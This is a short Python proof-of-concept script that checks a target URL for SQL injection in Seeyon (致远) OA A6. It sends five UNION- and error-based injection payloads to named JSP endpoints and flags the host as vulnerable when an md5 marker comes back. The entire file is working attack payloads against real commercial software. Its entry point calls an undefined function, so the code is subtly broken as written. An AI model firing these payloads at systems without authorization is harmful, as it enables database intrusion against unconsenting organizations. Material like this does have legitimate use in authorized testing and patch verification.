import re, requests
import urllib

def verify(url):
    relsult = {
        'name': '致远OA A6 sql注入漏洞',
        'vulnerable': False
    }
    payloads = [
    '/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(17)%20UnIoN%20SeLeCt%201,2,md5(1234),1%23',
    '/common/js/menu/test.jsp?doType=101&S1=SeLeCt%20Md5(1234)',
    '/HJ/iSignatureHtmlServer.jsp?COMMAND=DELESIGNATURE&DOCUMENTID=1&SIGNATUREID=2%27AnD%20(SeLeCt%201%20FrOm%20(SeLeCt%20CoUnT(*),CoNcaT(Md5(1234),FlOoR(RaNd(0)*2))x%20FrOm%20InFoRmAtIoN_ScHeMa.TaBlEs%20GrOuP%20By%20x)a)%23',
    "/ext/trafaxserver/ToSendFax/messageViewer.jsp?fax_id=-1'UnIoN%20AlL%20SeLeCt%20NULL,Md5(1234),NULL,NULL%23",
    '/ext/trafaxserver/SendFax/resend.jsp?fax_ids=(1)%20AnD%201=2%20UnIon%20SeLeCt%20Md5(1234)%20--',
        ]
    try:
        for payload in payloads:
            try:
                vurl = urllib.parse.urljoin(url, payload)
                req = requests.get(vurl, timeout=2)
                if re.search('81dc9bdb52d04dc20036dbd8313ed055', req.text) or re.search('52d04dc20036dbd8', req.text):
                    relsult['vulnerable'] = True
                    relsult['url'] = url
                    relsult['payload'] = vurl
                    relsult['about'] = 'https://www.cnblogs.com/AtesetEnginner/p/12106741.html'
                    return relsult
            except:
                continue
        return relsult
    except:
        return relsult

if __name__ == '__main__':
    url = input('url:')
    print(sessyon_a6_sqli(url))